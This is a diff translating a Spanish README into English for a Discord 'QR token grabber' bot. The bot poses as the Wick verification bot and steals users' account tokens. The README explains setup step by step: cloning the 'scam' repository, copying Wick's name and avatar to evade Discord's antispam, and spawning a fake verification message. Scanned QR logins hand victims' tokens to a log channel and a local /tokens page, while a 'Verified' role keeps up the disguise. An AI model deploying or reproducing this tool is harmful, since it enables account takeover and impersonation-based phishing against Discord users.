@@ -1,70 +1,69 @@
+## Features
 
-## Características
+- **Looks exactly like a real bot.** (when configured correctly)
+- **Efficient memory usage.** (doesn't use chromedriver.exe or any browser)
+- **Very stable and robust.** (minimal failures and errors)
+- **Unique working method** (doesn't use chromedriver.exe)
+- **Customizable** (change all appearance settings to fit your server)
 
-- **Se ve exactamente como un bot real.** (cuando se configura correctamente)
-- **Memoria eficiente.** (no usa chromedriver.exe ni ningún navegador)
-- **Muy estable y robusto.** (fallos y errores mínimos)
-- **Único método de trabajo** (que no usa chromedriver.exe)
-- **Personalizable** (cambie todas las configuraciones de apariencia para adaptarse a su servidor)
+## Disclaimers
 
-## Descargos de responsabilidad
+- This is a bot that is not affiliated with any of the Discord teams or Discord Inc.
+- This was made for educational purposes. It is not intended to be used for malicious purposes.
+- Any use of this bot is at your own risk. I am not responsible for any damages that may occur.
+- You must have a <a href="https://capmonster.cloud">CapMonster</a> account with funds for optimal performance.
 
-- Este es un bot que no está afiliado a ninguno de los equipos de Discord o Discord Inc.
-- Esto fue hecho con fines educativos. No está destinado a ser utilizado con fines maliciosos.
-- Cualquier uso de este bot es bajo su propio riesgo. No me hago responsable de los daños que puedan ocurrir.
-- Debe tener una cuenta <a href="https://capmonster.cloud">CapMonster</a> con fondos para un rendimiento óptimo.
+## How it works
 
-## Cómo funciona
+- The bot uses a WebSocket to connect to the Discord API to retrieve a login.
+- The login session then sends the bot a URL to generate a QR code for the user to scan.
+- After the user scans the QR code, the bot will retrieve the token and send it to a channel.
 
-- El bot usa un WebSocket para conectarse a la API de Discord para recuperar un inicio de sesión.
-- La sesión de inicio luego envía al bot una URL para generar un código QR para que el usuario lo escanee.
-- Después de que el usuario escanee el código QR, el bot recuperará el token y lo enviará a un canal.
+## Configuration
 
-## Configuración
-
-- **Requisitos previos de instalación** Los necesitará para poder ejecutar el bot de Discord.
+- **Prerequisites for installation** You will need these to be able to run the Discord bot.
   - [Node LTS](https://nodejs.org/en/)
   - [Git](https://git-scm.com/downloads)
-- **Clonar el Repositorio e Instalar Dependencias**
-  - `clon de git https://github.com/ulnk/scam.git`
-  - `instalación npm`
-- **Crear un nuevo Bot de Discord**
-  - **Habilitar todos los intentos para el bot** Esto es muy importante. Si no habilita todos los intentos, el bot no funcionará.
+- **Clone Repository and Install Dependencies**
+  - `git clone https://github.com/ulnk/scam.git`
+  - `npm install`
+- **Create a new Discord Bot**
+  - **Enable all intents for the bot** This is very important. If you don't enable all intents, the bot won't work.
     - https://discord.dev **Bot** > **Privileged Gateway**
-  - **Para obtener los mejores resultados** Discord tiene un sistema antispam que deshabilitará cualquier bot sospechoso. Para evitar esto, es mejor utilizar los recursos proporcionados que se encuentran [aquí](https://github.com/k4itrun/WickQrTokenGrabber/tree/master/profile). Para que encaje con el perfil, cambie el nombre del bot a 'Wick' y configure la imagen de perfil como la proporcionada.
-  - **Invita al bot a tu servidor** Usa el siguiente enlace para invitar a tu bot a tu servidor. Cambie `CLIENTID` por la ID  de su bot de Discord.
-    - Para obtener la ID del bot > https://discord.dev **Oauth2** > **General**
+  - **For best results** Discord has an antispam system that will disable any suspicious bots. To avoid this, it is best to use the provided resources found [here](https://github.com/k4itrun/WickQrTokenGrabber/tree/master/profile). To fit with the profile, change the bot's name to 'Wick' and set the profile picture as provided.
+  - **Invite the bot to your server** Use the following link to invite your bot to your server. Change `CLIENTID` to your Discord bot's ID.
+    - To get the bot's ID > https://discord.dev **Oauth2** > **General**
     - `https://discord.com/api/oauth2/authorize?client_id=CLIENTID&permissions=1376537135104&scope=bot%20applications.commands`
-- **Configurar el Proyecto**
-  - Cambiar el nombre de `ex.config.json` a `config.json`. Este se encuentra en `src/ex.config.json`.
-  - Editar todas las claves y sus valores. No se requiere dar un valor a capmonster, sin embargo se recomienda.
-  - Al ingresar `log.guildId` y `log.channelId`, debe ingresar la identificación del servidor y el canal en el que se encuentra el bot. De lo contrario, el bot no podrá enviar el token y se bloqueará.
-- **Simular bot de verificación real**
-  - En cada servidor en el que desee que esté el bot, cree un nuevo rol llamado "Verified". (Asegúrese de que el rol esté debajo del bot)
-  - use el comando `/role` para establecer la identificación del rol en el rol que acaba de crear.
-  - Esto se le dará al usuario después de escanear el qrcode.
-- **Iniciar el bot**
-  - `inicio de ejecución npm`
-  - Una vez que el bot esté activo, use el comando `/spawn` para generar el mensaje de verificación.
-  - Tambien se abrira el puerto **3000** en [localhost:3000](http://localhost:3000/) en la ruta [localhost:3000/tokens](http://localhost:3000/tokens) se encuentran los tokens que fueron tomados de el codigo QR
+- **Configure the Project**
+  - Change the name of `ex.config.json` to `config.json`. This is located in `src/ex.config.json`.
+  - Edit all keys and their values. It is not required to give a value to capmonster, however it is recommended.
+  - When entering `log.guildId` and `log.channelId`, you must enter the ID of the server and channel where the bot is located. Otherwise, the bot won't be able to send the token and will crash.
+- **Simulate Real Verification Bot**
+  - In every server where you want the bot to be, create a new role called "Verified". (Make sure the role is below the bot)
+  - Use the command `/role` to set the role ID to the role you just created.
+  - This will be given to the user after scanning the QR code.
+- **Start the Bot**
+  - `npm start`
+  - Once the bot is active, use the command `/spawn` to generate the verification message.
+  - The port **3000** will also be opened at [localhost:3000](http://localhost:3000/), and the tokens taken from the QR code can be found at [localhost:3000/tokens](http://localhost:3000/tokens).
 
-(_único archivo ejecutable próximamente_)
+(_unique executable file coming soon_)
 
-## Imagen de vista previa
+## Preview Image
 
-![Vista previa](https://user-images.githubusercontent.com/93608862/224277763-d9734632-2469-4b98-b239-27cd6c3247e9.png)
+![Preview](https://user-images.githubusercontent.com/93608862/224277763-d9734632-2469-4b98-b239-27cd6c3247e9.png)
 
-## Bibliotecas utilizadas
+## Used Libraries
 
-- **discord.js** (discord bot) <img alt="insignia de vista previa" src="https://img.shields.io/npm/v/discord.js">
-- **crypto** (claves privadas y claves públicas) <img alt="insignia de vista previa" src="https://img.shields.io/npm/v/crypto">
-- **ws** (socket web) <img alt="insignia de vista previa" src="https://img.shields.io/npm/v/ws">
-- **capmonster** (anti-captcha)<img alt="insignia de vista previa" src="https://img.shields.io/npm/v/node-capmonster">
+- **discord.js** (discord bot) <img alt="Preview badge" src="https://img.shields.io/npm/v/discord.js">
+- **crypto** (private and public keys) <img alt="Preview badge" src="https://img.shields.io/npm/v/crypto">
+- **ws** (web socket) <img alt="Preview badge" src="https://img.shields.io/npm/v/ws">
+- **capmonster** (anti-captcha) <img alt="Preview badge" src="https://img.shields.io/npm/v/node-capmonster">
 
 ## Idk
 
-[X] Si necesitas ayuda [yvk4itrun](https://discord.com/users/1088554690268119103) o agregame como **yvk4itrun**
+[X] If you need help, contact **yvk4itrun** (https://discord.com/users/1088554690268119103) or add me as **yvk4itrun**
 
-[X] Creditos **k4itrun** & **End**
+[X] Credits to **k4itrun** & **End**
 
-# DUALHOOK Solo de testeo y con errores solucionados.
+# DUALHOOK Testing only and with solved errors.
